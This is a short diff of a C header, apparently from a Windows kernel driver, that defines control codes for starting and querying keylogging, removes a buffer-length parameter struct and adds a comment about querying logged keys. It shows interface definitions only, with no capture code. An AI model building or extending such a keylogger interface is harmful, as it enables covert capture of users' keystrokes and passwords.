@@ -29,13 +29,9 @@ struct CopyToMemoryParams {
 */
 #define IOCTL_START_KEYLOGGING CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-struct StartKeyloggingParams {
-	/*	
-		Length of saved keyboard strokes
-	*/
-	ULONG MaxBufferLength;
-};
-
+/*
+	Queries logged keys.
+*/
 #define IOCTL_QUERY_KEYLOGGING CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 /*
